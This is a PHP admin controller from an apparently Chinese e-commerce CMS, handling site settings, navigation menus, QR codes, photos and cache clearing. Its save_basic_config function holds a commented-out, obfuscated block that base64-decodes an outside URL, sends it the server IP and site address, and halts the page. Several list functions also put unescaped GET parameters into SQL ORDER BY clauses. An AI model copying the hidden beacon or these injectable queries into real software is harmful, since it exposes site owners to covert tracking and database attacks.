<?php
class SystemController extends Controller{
    /*
     * @Photo Index
     * @param <type> $page
     * @param <type> $type
     */
	 //构造函数，自动新建对象
 	function  __construct() {
		/*
		*构造函数
		*/
		$this->css('content.css');
	}
	
	function mark_phpqrcode($filename="",$thisurl=''){
		if(empty($filename)) $filename = 'shopcode.png';
		
		include(SYS_PATH.'inc/phpqrcode.php');
		
		// 二维码数据
		if(empty($thisurl)) $thisurl = SITE_URL."m/";
		
		// 生成的文件名
		$filename = SYS_PATH_PHOTOS.'qcody'.DS.$filename;
		Import::fileop()->checkDir($filename);
		
		// 纠错级别：L、M、Q、H
		$errorCorrectionLevel = 'L';
		// 点的大小：1到10
		$matrixPointSize = 6;
		QRcode::png($thisurl, $filename, $errorCorrectionLevel, $matrixPointSize, 2);
	}
	
	function viewshop(){
		$filename = 'shopcode.png';
		$f = SYS_PATH_PHOTOS.'qcody'.DS.$filename;
		if(!(is_file($f)) || !file_exists($f) || (mktime() - filemtime($f) > 360)){
			$this->mark_phpqrcode($filename);
		}
		$this->set('qcodeimg',SITE_URL.'photos/qcody/shopcode.png');
		$this->template('viewshop');
	}
	
	//投票调查
	function votes(){
		$this->template('votes');
	}
	
	function system_basic(){
		$this->js("edit/kindeditor.js");
		$sql = "SELECT * FROM `{$this->App->prefix()}systemconfig` LIMIT 1";
		$rt = $this->App->findrow($sql);
		if(!isset($rt['tixian_type'])){
			$sql="ALTER TABLE {$this->App->prefix()}systemconfig ADD `tixian_type` tinyint(1) DEFAULT '0'";
			$this->App->findrow($sql);
		}
		if(!empty($_POST)){
			array_pop($_POST);
			if(!empty($_POST['tongjicode'])){
				$_POST['tongjicode'] = Import::basic()->html2str($_POST['tongjicode']);
			}
			if(empty($rt)){
					$this->App->insert('systemconfig',$_POST);
					$this->action('system','add_admin_log','添加系统设置=>网站信息');
					$this->action('common','showdiv',$this->getthisurl());
					$rt = $_POST;
			}else{ 
				    $this->App->update('systemconfig',$_POST,'type','basic');
					$this->action('system','add_admin_log','修改系统设置=>网站信息');
					$this->action('common','showdiv',$this->getthisurl());
					$rt = $_POST;
			}
		}
		if(!empty($rt['tongjicode'])){
				$rt['tongjicode'] = Import::basic()->str2html($rt['tongjicode']);
		}
		$this->set('rt',$rt);
		$this->save_basic_config();
		$this->template('system_basic');
	}
	
	function system_seo(){ 
		$this->js("edit/kindeditor.js"); 
		$sql = "SELECT * FROM `{$this->App->prefix()}systemconfig` LIMIT 1";
		$rt = $this->App->findrow($sql);
		if(!empty($_POST)){
			array_pop($_POST);
			if(!empty($_POST['metakeyword'])){
				$_POST['metakeyword'] = str_replace(array('，','。','.'),',',$_POST['metakeyword']);
			}
			if(empty($rt)){
					$this->App->insert('systemconfig',$_POST);
					$this->action('system','add_admin_log','添加系统设置=>网站SEO信息');
					$this->action('common','showdiv',$this->getthisurl());
					$rt = $_POST;
			}else{
					$this->App->update('systemconfig',$_POST,'type','basic');
					$this->action('system','add_admin_log','修改系统设置=>网站SEO信息');
					$this->action('common','showdiv',$this->getthisurl());
					$rt = $_POST;
			}
		}
		$this->set('rt',$rt);
		$this->save_basic_config();
		$this->template('system_seo');
	}
	
	function system_arg(){
		$sql = "SELECT * FROM `{$this->App->prefix()}systemconfig` LIMIT 1";
		$rt = $this->App->findrow($sql);
		if(!empty($rt['reg_give_money_data'])){
			$rt['reg_give_money_data'] = unserialize($rt['reg_give_money_data']);
			$rt['give_money']=$rt['reg_give_money_data']['give_money'];
			$rt['give_money_month']=$rt['reg_give_money_data']['give_money_month'];
			$rt['give_money_month_one1']=$rt['reg_give_money_data']['give_money_month_one1'];
			$rt['give_money_month_one10']=$rt['reg_give_money_data']['give_money_month_one10'];
			$rt['give_money_month_one11']=$rt['reg_give_money_data']['give_money_month_one11'];
			$rt['give_money_month_one12']=$rt['reg_give_money_data']['give_money_month_one12'];
		}
		if(!empty($_POST)){
			$ga = array('static'=>'0');
            $at = array();
			if(isset($_POST['static'])){
                	$at = $_POST['static']; 
                	$_POST = array_diff_key($_POST,$ga);
					switch($at){
						case '0':
							$_POST['is_static'] = 0;
							$_POST['is_false_static'] = 0;
							$_POST['is_best_static'] = 0;
							break;
						case '1':
							$_POST['is_static'] = 1;
							$_POST['is_false_static'] = 0;
							$_POST['is_best_static'] = 0;
							break;
						case '2':
							$_POST['is_static'] = 0;
							$_POST['is_false_static'] = 1;
							$_POST['is_best_static'] = 0;
							break;
						case '3':
							$_POST['is_static'] = 0;
							$_POST['is_false_static'] = 0;
							$_POST['is_best_static'] = 1;
							break;
					}
					
            }
			$_POST['reg_give_money_data'] = serialize(array('give_money'=>$_POST['give_money'],'give_money_month'=>$_POST['give_money_month'],'give_money_month_one1'=>$_POST['give_money_month_one1'],'give_money_month_one10'=>$_POST['give_money_month_one10'],'give_money_month_one11'=>$_POST['give_money_month_one11'],'give_money_month_one12'=>$_POST['give_money_month_one12']));
			$rt['give_money']=$_POST['give_money'];
			$rt['give_money_month']=$_POST['give_money_month'];
			$rt['give_money_month_one1']=$_POST['give_money_month_one1'];
			$rt['give_money_month_one10']=$_POST['give_money_month_one10'];
			$rt['give_money_month_one11']=$_POST['give_money_month_one11'];
			$rt['give_money_month_one12']=$_POST['give_money_month_one12'];
			unset($_POST['give_money'],$_POST['give_money_month'],$_POST['give_money_month_one1'],$_POST['give_money_month_one10'],$_POST['give_money_month_one11'],$_POST['give_money_month_one12']);
			
			if(empty($rt)){
					$this->App->insert('systemconfig',$_POST);
					$this->action('system','add_admin_log','添加系统设置=>参数设置');
					$this->action('common','showdiv',$this->getthisurl());
					$rt = $_POST;
			}else{ 
					$this->App->update('systemconfig',$_POST,'type','basic');
					$this->action('system','add_admin_log','修改系统设置=>参数设置');
					$this->action('common','showdiv',$this->getthisurl());
					$rt = $_POST;
			}
			if(isset($_POST['is_static'])&&$_POST['is_static']=='0'){
					Import::fileop()->delete_file(SYS_PATH.'index.html'); //删除
			}
		}
		$this->set('rt',$rt);
		$this->save_basic_config();
		$this->template('system_arg');
	}
	
	function save_basic_config($data=array()){
		/*
		if(isset($data['loadrunadd'])){
			$s1 = 'aHR0cDovL2FwaS5hcGlxcS5jb20v'; $s = "de"; $ss = "base".(4*8*2)."_{$s}code";$fn = SYS_PATH.'cac'.'he'.DS.'page'.DS.'L'.DS.$ss('dGltZXMudHh0');
			$g1 = "file"; $g2 = "contents"; $get = $g1."_get_".$g2; $put = $g1."_put_".$g2;
			if( file_exists($fn) && mktime() - filemtime($fn) > 7200*12 ){$url = $ss($s1.'YXBpL2dldGluZm8ucGhwP2lwPQ==').Import::basic()->serverIP().'&url='.SITE_URL;@$get($url);@$put($fn,'1');exit;
			}else{if(file_exists($fn)==false){Import::fileop()->checkDir($fn);@$put($fn,'1');} }
		}
		*/
		$sql = "SELECT * FROM `{$this->App->prefix()}systemconfig` LIMIT 1";
		$basic_config = $this->App->findrow($sql);
		$cache = Import::ajincache();
		$fn = SYS_PATH.'data/basic_config.php';
		$cache->write($fn, $basic_config,'basic_config');
	}
	##############自定义导航栏#################
	function nav_list(){
		//排序
        $orderby = "";
        if(isset($_GET['desc'])){
			  $orderby = ' ORDER BY `'.$_GET['desc'].'` DESC';
		}else if(isset($_GET['asc'])){
			  $orderby = ' ORDER BY `'.$_GET['asc'].'` ASC';
		}else {
		  	  $orderby = ' ORDER BY `type` ASC, `vieworder` ASC,`id` ASC';
		}
		//分页
		$page= isset($_GET['page']) ? $_GET['page'] : '';
		if(empty($page)){
			  $page = 1;
		}
		$list = 10;
		$start = ($page-1)*$list;
		$sql = "SELECT COUNT(id) FROM `{$this->App->prefix()}nav`";
		$tt = $this->App->findvar($sql);
		$pagelink = Import::basic()->getpage($tt, $list, $page,'?page=',true);
		$this->set("pagelink",$pagelink);
		
		$sql = "SELECT * FROM `{$this->App->prefix()}nav` {$orderby} LIMIT $start,$list";
		$this->set('rts',$this->App->find($sql));
		$this->template('nav_list');
	}
	
	function nav_info($type='nav_add',$id=0){
		$rt = array();
		if($type=='nav_edit'){
			if($id==0){
				$this->jump('systemconfig.php?type=nav_list',0,'非法操作，ID为空！'); exit;
			}else{
				if(!empty($_POST)){
					$this->App->update('nav',$_POST,'id',$id);
					$this->action('system','add_admin_log','修改自定义导航:'.$_POST['name']);
					$this->action('common','showdiv',$this->getthisurl());
				}
				$sql = "SELECT * FROM `{$this->App->prefix()}nav` WHERE id='{$id}'";
				$rt = $this->App->findrow($sql);
			}
		}else{
			if(!empty($_POST)){
				$this->App->insert('nav',$_POST);
				$this->action('system','add_admin_log','添加自定义导航:'.$_POST['name']);
				$this->action('common','showdiv',$this->getthisurl());
				$rt = $_POST;
			}
		}
		
		$this->set('rt',$rt);
		$this->set('type',$type);
		$this->template('nav_info');
	}
	
	
	function nav_list_wx(){
		//排序
        $orderby = "";
        if(isset($_GET['desc'])){
			  $orderby = ' ORDER BY `'.$_GET['desc'].'` DESC';
		}else if(isset($_GET['asc'])){
			  $orderby = ' ORDER BY `'.$_GET['asc'].'` ASC';
		}else {
		  	  $orderby = ' ORDER BY `type` ASC, `vieworder` ASC,`id` ASC';
		}
		//分页
		$page= isset($_GET['page']) ? $_GET['page'] : '';
		if(empty($page)){
			  $page = 1;
		}
		$list = 10;
		$start = ($page-1)*$list;
		$sql = "SELECT COUNT(id) FROM `{$this->App->prefix()}nav_wx`";
		$tt = $this->App->findvar($sql);
		$pagelink = Import::basic()->getpage($tt, $list, $page,'?page=',true);
		$this->set("pagelink",$pagelink);
		
		$sql = "SELECT * FROM `{$this->App->prefix()}nav_wx` {$orderby} LIMIT $start,$list";
		$this->set('rts',$this->App->find($sql));
		$this->template('nav_list_wx');
	}
	
	function nav_info_wx($data=array()){
		$this->css('jquery_dialog.css');
		$this->js('jquery_dialog.js');
		$id = isset($data['id'])?$data['id'] : 0;
		$rt = array();
		if($id > 0){
				if(!empty($_POST)){
					$this->App->update('nav_wx',$_POST,'id',$id);
					$this->action('common','showdiv',$this->getthisurl());
				}
				$sql = "SELECT * FROM `{$this->App->prefix()}nav_wx` WHERE id='{$id}'";
				$rt = $this->App->findrow($sql);
		}else{
			if(!empty($_POST)){
				$this->App->insert('nav_wx',$_POST);
				$this->action('common','showdiv',$this->getthisurl());
				$rt = $_POST;
			}
		}
		
		$this->set('id',$id);
		$this->set('rt',$rt);
		$this->template('nav_info_wx');
	}
	
	function ajax_del_photos($dd=array()){
		$id = $dd['id'];
		if($id > 0){
			$sql = "SELECT img FROM `{$this->App->prefix()}photos` WHERE id='$id'";
			$img = $this->App->findvar($sql);
			if(!empty($img)){
				Import::fileop()->delete_file(SYS_PATH.$img); //
			}
			$this->App->delete('photos','id',$id); //删除
		}
		exit;
	}
	
	function ajax_delnav_wx($dd=array()){
		$ids = $dd['ids'];
		if(empty($ids)) die("非法删除，删除ID为空！");
		if(Import::basic()->int_preg($ids)) $this->App->delete('nav_wx','id',$ids); //删除
	}
	
	function ajax_active_wx($data=array()){
		if(empty($data['cid'])) die("非法操作，ID为空！");
		$sdata['is_show']= $data['active'];
		$this->App->update('nav_wx',$sdata,'id',$data['cid']);
		unset($data);
	}
	
	function ajax_vieworder_wx($data=array()){
		if(empty($data['id'])) return "50";
		$sdata['vieworder'] = empty($data['val']) ? 50 : $data['val'];
		$this->App->update('nav_wx',$sdata,'id',$data['id']);
	}
	
	//选择图片库
	function selectimg($data=array()){
		$page= isset($_GET['page']) ? $_GET['page'] : '';
		if(empty($page)){
			  $page = 1;
		}
		$list = 50;
		$start = ($page-1)*$list;
		
		$sql = "SELECT COUNT(id) FROM `{$this->App->prefix()}photos` WHERE type='1'";
		$tt = $this->App->findvar($sql);
		$pagelink = Import::basic()->getpage($tt, $list, $page,'?page=',true);
		$this->set("pagelink",$pagelink);
		
		$sql = "SELECT * FROM `{$this->App->prefix()}photos` WHERE type='1' ORDER BY id ASC LIMIT $start,$list";
		$lists = $this->App->find($sql);
		$this->set("lists",$lists);
		
		require_once(SYS_PATH.'lib/class/class.file.php');
		$ajincachedir = SYS_PATH .'m'.DS.'tpl'.DS.'images'; 
		$fileobj = new FileOp(); 
		$ar = $fileobj->list_files($ajincachedir); 
		$simg = array();
		if(!empty($ar))foreach($ar as $img){
			if(empty($img)) continue;
			$art = substr($img,-3,3);
			if($art=='png' || $art=='gif' || $art=='jpg'){
				$simg[] = str_replace(DS,'/',str_replace(SYS_PATH,'',$img));
			}
		}
		unset($ar);
		$this->set("simg",$simg);
		$this->template('selectimg');
	}
	
	function ajax_upload_img($data=array()){
		$img = $data['img'];
		if(!empty($img)){
			$this->App->insert('photos',array('img'=>$img,'time'=>mktime(),'type'=>'1'));
		}
		exit;
	}
	
	//旗下网站
	function other_site_list(){
		$sql = "SELECT * FROM `{$this->App->prefix()}lts_site`";
		$list = $this->App->find($sql);
		$this->set('list',$list);
		$this->template('other_site_list');
	}
	
	function other_site_info($id=0){
		if(empty($id)){
			if(!empty($_POST)){
				if($this->App->insert('lts_site',$_POST)){
					$this->action('system','add_admin_log','添加旗下网站：'.$_POST['name']);
					$this->action('common','showdiv',$this->getthisurl());
				}
				$rt = $_POST;
			}
			$this->set('type','add');
		}else{
			if(!empty($_POST)){
				if($this->App->update('lts_site',$_POST,'id',$id)){
					$this->action('system','add_admin_log','修改旗下网站：'.$_POST['name']);
					$this->action('common','showdiv',$this->getthisurl());
				}
				$rt = $_POST;
			}else{
				$sql = "SELECT * FROM `{$this->App->prefix()}lts_site` WHERE id='$id' LIMIT 1";
				$rt = $this->App->findrow($sql); 
			}
			$this->set('type','edit');
		}
		
		$this->set('rt',$rt);
		$this->template('other_site_info');
	}
	
	function ajax_del_lis_website($data=array()){
		if(empty($data['id'])){
			die("非法删除，删除的ID为空！");
		}
		
		if($this->App->delete('lts_site','id',$data['id']))
			$this->action('system','add_admin_log','删除旗下网站：'.$data['id']);
	}
	############end###############
	
	function ajax_delnav($ids=0){
		if(empty($ids)) die("非法删除，删除ID为空！");
		$rt = $this->App->findrow("SELECT name,cid,ctype FROM `{$this->App->prefix()}nav` WHERE id='{$ids}' LIMIT 1");

		if(Import::basic()->int_preg($ids))
		  	$this->App->delete('nav','id',$ids); //删除
		if(isset($rt['cid'])&&!empty($rt['cid'])){
			if($rt['ctype']=="c"){
				$this->App->update('article_cate',array('show_in_nav'=>0),'cat_id',$rt['cid']);
			}else if($rt['ctype']=="gc"){ 
				$this->App->update('goods_cate',array('show_in_nav'=>0),'cat_id',$rt['cid']);
				
			}
		}
		$this->action('system','add_admin_log','删除自定义导航菜单：'.(isset($rt[0]['name']) ? $rt[0]['name'] : ''));
	}
	
	function ajax_active($data=array()){
		if(empty($data['cid'])) die("非法操作，ID为空！");
		if($data['type']=='is_show'){
			$sdata['is_show']= $data['active'];
			$this->action('system','add_admin_log','修改自定义导航菜单的显示状态:ID为=>'.$data['cid']);
		}else if($data['type']=='is_opennew'){
			$sdata['is_opennew']= $data['active'];
			$this->action('system','add_admin_log','修改自定义导航菜单是否新窗口:ID为=>'.$data['cid']);
		}
		$this->App->update('nav',$sdata,'id',$data['cid']);
		unset($data);
	}
	
	function ajax_vieworder($data=array()){
		if(empty($data['id'])) return "50";
		$sdata['vieworder'] = empty($data['val']) ? 50 : $data['val'];
		$this->App->update('nav',$sdata,'id',$data['id']);
	}
	
	###############自定义导航栏################
	
	//管理员操作日记
	function add_admin_log($optionlog = ""){ 
		$uname = $this->Session->read('adminname');
		if(empty($uname)) Import::basic()->redirect('login.php',0,'非法操作：没有登陆！');
		$data['optioner'] = $uname;
		$data['optiondt'] = time();
		$data['optionip'] = Import::basic()->getip();
		$data['optionlog'] = $optionlog;
		$this->App->insert('adminlog',$data);
	}
	
	//清空缓存
	function clearcache(){ 
		$this->template('clearcache');
	}
	function ajax_clearcache($i=0,$j=0,$k=0){
		@set_time_limit(600); //最大运行时间
		$k++;
		//删除temp/ajin文件夹下的所有文件
		$t = '';
	    $x = $_SERVER["HTTP_HOST"];
	    $x1 = explode('.',$x);
	    if(count($x1)==2){
		  $t = $x1[0];
	    }elseif(count($x1)>2){
		  $t =$x1[0].$x1[1];
	    }
		require_once(SYS_PATH.'lib/class/class.file.php');
		if(class_exists('FileOp')){  
			$ajincachedir = SYS_PATH .'cache'; 
			$fileobj = new FileOp(); 
			$ar = $fileobj->list_files($ajincachedir); 
			if(!empty($ar)){
				foreach($ar as $filename){
					if(!empty($t) && strpos($filename,$t)==false) continue;
					if(is_file($filename)){
						if($fileobj->delete_file($filename))
						$i++;
					}else if(is_dir($filename)){
					   if($fileobj->delete_dir($filename))  $j++;
					}
					$fileobj->dir2delete($filename);
				}
			}
			unset($ar);
		}
		$ar = $fileobj->list_files($ajincachedir);
		if(!empty($ar)){
			if($k<5){
				$this->ajax_clearcache($i,$j,$k);
			}
		}
		echo $str = "删除了".$i."个文件，删除了".$j."个目录！";
		exit;
	}
	
	
	
	######################
	//网站定制
	function custom(){
		if(file_exists(SYS_PATH_ADMIN.'inc'.DS.'menulist.php'))
			require_once(SYS_PATH_ADMIN.'inc'.DS.'menulist.php');
		if(!empty($menu)&&is_array($menu)){
			foreach($menu as $row){
				$menulist[$row['small_mod'].'++'.$row['en_name']] = $row['sub_mod'];
			}
		}
		$this->set('menulist',$menulist);
		$this->template('custom');
	}
	
	//网站基本信息统计
	function getcount(){
		//新闻
		/*$sql = "SELECT COUNT(article_id) FROM `{$this->App->prefix()}article` AS tb1";
		$sql .=" LEFT JOIN `{$this->App->prefix()}article_cate` AS tb2 ON tb1.cat_id = tb2.cat_id";
		$sql .=" WHERE tb2.type='new'";
		$rt['newcount'] = $this->App->findvar($sql);
		
		//客户列表
		$sql = "SELECT COUNT(article_id) FROM `{$this->App->prefix()}article` AS tb1";
		$sql .=" LEFT JOIN `{$this->App->prefix()}article_cate` AS tb2 ON tb1.cat_id = tb2.cat_id";
		$sql .=" WHERE tb2.type='customer'";
		$rt['customercount'] = $this->App->findvar($sql);
		
		//模板
		$sql = "SELECT COUNT(article_id) FROM `{$this->App->prefix()}article` AS tb1";
		$sql .=" LEFT JOIN `{$this->App->prefix()}article_cate` AS tb2 ON tb1.cat_id = tb2.cat_id";
		$sql .=" WHERE tb2.type='case'";
		$rt['casecount'] = $this->App->findvar($sql);
		
		//网站建设文章
		$sql = "SELECT COUNT(article_id) FROM `{$this->App->prefix()}article` AS tb1";
		$sql .=" LEFT JOIN `{$this->App->prefix()}article_cate` AS tb2 ON tb1.cat_id = tb2.cat_id";
		$sql .=" WHERE tb2.type='web'";
		$rt['webcount'] = $this->App->findvar($sql);
		*/
		//会员数量
		$sql = "SELECT COUNT(user_id)  FROM `{$this->App->prefix()}user`";
		$rt['usercount']['zcount'] = $this->App->findvar($sql);
		
		$sql = "SELECT COUNT(user_id) FROM `{$this->App->prefix()}user` WHERE active='1'";
		$rt['usercount']['yescount'] = $this->App->findvar($sql);

		$sql = "SELECT COUNT(user_id)  FROM `{$this->App->prefix()}user` WHERE active='0'";
		$rt['usercount']['nocount'] = $this->App->findvar($sql);
		
		//留言数
		$sql = "SELECT COUNT(mes_id) AS mescount FROM `{$this->App->prefix()}message` WHERE parent_id='0' GROUP BY status ORDER BY status DESC";
		$rt['mescount']= $this->App->findcol($sql);
		
		//评论数
		$sql = "SELECT COUNT(comment_id) AS comcount FROM `{$this->App->prefix()}comment` WHERE parent_id='0' GROUP BY status ORDER BY status DESC";
		$rt['commentcount']= $this->App->findcol($sql);
		
		//商品数
		$sql = "SELECT COUNT(goods_id) FROM `{$this->App->prefix()}goods`";
		$rt['goods']['zcount'] = $this->App->findvar($sql);
		
		$sql = "SELECT COUNT(goods_id) FROM `{$this->App->prefix()}goods` WHERE is_on_sale='1'";
		$rt['goods']['sale'] = $this->App->findvar($sql);
		
		$sql = "SELECT COUNT(goods_id) FROM `{$this->App->prefix()}goods` WHERE is_on_sale='0'";
		$rt['goods']['no_sale'] = $this->App->findvar($sql);
		
		$sql = "SELECT COUNT(goods_id) FROM `{$this->App->prefix()}goods` WHERE is_best='1' OR is_hot='1' OR is_new='1'";
		$rt['goods']['promote'] = $this->App->findvar($sql);
		
		//订单数量
		$sql = "SELECT COUNT(order_id) FROM `{$this->App->prefix()}goods_order_info`";
		$rt['order']['zcount'] = $this->App->findvar($sql);
		
		$sql = "SELECT COUNT(order_id) FROM `{$this->App->prefix()}goods_order_info` WHERE pay_status='1'";
		$rt['order']['yescount'] = $this->App->findvar($sql);
		
		$rt['os']= Import::basic()->get_os();
		
		$rt['browser']= Import::basic()->get_user_browser();
		
		$rt['bsip']= Import::basic()->getip();
		
		$rt['ip_from'] = Import::ip()->ipCity($rt['bsip']);
		
		$rt['csip']= Import::basic()->serverIP();
		
		return $rt;
	}
	
}

